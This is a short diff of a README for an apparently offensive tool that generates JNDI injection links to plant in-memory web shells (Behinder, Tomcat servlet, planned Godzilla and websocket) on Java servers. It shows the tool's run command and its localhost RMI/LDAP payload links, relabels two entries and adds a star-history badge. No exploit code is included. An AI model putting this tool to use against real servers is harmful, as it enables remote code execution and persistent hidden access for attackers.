@@ -20,10 +20,10 @@ $ java -jar JNDI-Injection-Memshell-1.0-SNAPSHOT-all.jar
 ----------------------------JNDI Links----------------------------
 Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
 rmi://127.0.0.1:1099/qbf3r4
-Target environment(Behinder Memshell):
+Target environment(Behinder Servlet Memshell):
 rmi://127.0.0.1:1099/7oufct
 ldap://127.0.0.1:1389/7oufct
-Target environment(Tomcat Memshell):
+Target environment(Tomcat Servlet Memshell):
 rmi://127.0.0.1:1099/zskyrz
 ldap://127.0.0.1:1389/zskyrz
 Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
@@ -58,3 +58,9 @@ ldap://127.0.0.1:1389/jkzrcz
 - 更新weblogic以及其他中间件的内存马注入环境
 - 增加注入哥斯拉内存马的模块
 - 加入websocket内存马
+
+
+
+## Star History
+
+[![Star History Chart](https://api.star-history.com/svg?repos=MUYU212/JNDI-Injection-Memshell&type=Date)](https://star-history.com/#MUYU212/JNDI-Injection-Memshell&Date)
